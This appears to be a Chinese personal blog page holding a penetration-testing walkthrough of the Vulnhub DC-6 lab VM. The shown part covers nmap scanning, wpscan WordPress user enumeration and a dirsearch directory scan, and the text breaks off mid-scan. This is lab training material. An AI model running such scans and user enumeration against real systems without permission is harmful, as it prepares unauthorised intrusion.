<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c7a2fe90f78ca0e4.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c7a2fe90f78ca0e4.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/lg8P0Lo-zDl0pbzeQCZZz/_buildManifest.js" defer=""></script><script src="/_next/static/lg8P0Lo-zDl0pbzeQCZZz/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubDC-6","contentHtml":"\u003ch1\u003eDC-6\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/dc-6,315/\"\u003ehttps://www.vulnhub.com/entry/dc-6,315/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e177\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-02 22:39 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00021\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00019\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.177\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00013\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:C7:D5:\u003cspan class=\"hljs-title function_ invoke__\"\u003eF4\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00018\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FE:CA:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eA (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描靶机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.177\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-02 22:39 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.177\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0013\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65533\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:C7:D5:\u003cspan class=\"hljs-title function_ invoke__\"\u003eF4\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描服务版本及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p80,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.177\u003c/span\u003e     \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-02 22:40 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.177\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00038\u003c/span\u003es latency).\n\nPORT   STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e7.4\u003c/span\u003ep1 Debian \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e+\u003cspan class=\"hljs-title function_ invoke__\"\u003edeb9u6\u003c/span\u003e (protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e ((Debian))\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:C7:D5:\u003cspan class=\"hljs-title function_ invoke__\"\u003eF4\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e.X|\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e3.2\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e4.9\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e\n//\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00026\u003c/span\u003es latency).\n\nPORT   STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e DOM based XSS.\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n| http-wordpress-users: \n| Username found: admin\n| Username found: graham\n| Username found: mark\n| Username found: sarah\n| Username found: jens\n|_Search stopped at ID #25. Increase the upper limit if necessary with '\u003c/span\u003ehttp-wordpress-users.limit\u003cspan class=\"hljs-string\"\u003e'\n| http-enum: \n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2 \n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|   /wp-login.php: Wordpress login page.\n|   /wp-admin/upgrade.php: Wordpress login page.\n|_  /readme.html: Interesting, a readme.\nMAC Address: 00:0C:29:C7:D5:F4 (VMware)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e网站CMS是\u003ccode\u003ewordpress\u003c/code\u003e ，并且找到了几个用户名，其中包括\u003ccode\u003eadmin\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e话不多说，先用\u003ccode\u003ewpscan\u003c/code\u003e扫描一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# wpscan -e u --url http://wordy         \u003c/span\u003e\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | \u003cspan class=\"hljs-string\"\u003e'_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://wordy/ [192.168.75.177]\n[+] Started: Sat Nov  2 22:45:10 2024\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.25 (Debian)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://wordy/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).\n | Found By: Rss Generator (Passive Detection)\n |  - http://wordy/index.php/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=5.1.1\u0026#x3C;/generator\u003e\n |  - http://wordy/index.php/comments/feed/, \u0026#x3C;generator\u003ehttps://wordpress.org/?v=5.1.1\u0026#x3C;/generator\u003e\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://wordy/wp-content/themes/twentyseventeen/\n | Last Updated: 2024-07-16T00:00:00.000Z\n | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt\n | [!] The version is out of date, the latest version is 3.7\n | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: '\u003c/span\u003eVersion: \u003cspan class=\"hljs-number\"\u003e2.1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 \u0026#x3C;====================================================================================================================================\u003e (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By:\n |  Wp Json Api (Aggressive Detection)\n |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100\u0026#x26;page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] graham\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] mark\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] sarah\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] jens\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录，也没什么实质性有用的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e                             \n//                                                                                                                                                                                   \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e -   51KB - /index.php/login/                                 \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   18KB - /index.php                                        \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    7KB - /license.txt                                      \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    3KB - /readme.html                                      \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  319B  - /wp-admin  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e/wp-admin/    \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -    3KB - /wp-admin/setup-config.php                        \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e400\u003c/span\u003e -    1B  - /wp-admin/admin-ajax.php                          \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /wp-admin/  -\u003e  http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192\u003cspan class=\"hljs-number\"\u003e.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e%2Fwp-admin%2F\u0026#x26;reauth=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-config.php\n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  517B  - /wp-admin/install.php                             \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-content/                                      \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  321B  - /wp-content  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e/wp-content/\n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -    0B  - /wp-content/plugins/hello.php                     \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  322B  - /wp-includes  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.177\u003c/span\u003e/wp-includes/\n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -    0B  - /wp-includes/rss-functions.php                    \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    0B  - /wp-cron.php                                      \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    1KB - /wp-login.php\n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /wp-signup.php  -\u003e  http://wordy/wp-login.php?action=register\n[\u003cspan 